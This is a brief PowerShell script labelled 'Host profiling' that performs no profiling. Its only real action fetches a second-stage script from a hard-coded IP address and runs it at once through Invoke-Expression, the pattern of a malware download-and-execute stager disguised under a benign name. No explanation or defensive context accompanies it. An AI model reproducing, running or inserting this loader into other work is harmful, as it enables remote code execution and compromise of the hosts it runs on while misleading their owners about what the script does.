<# Host profiling #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://203.0.113.67/stage2.ps1',
    [int]$TransferTimeout = 89
)
IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
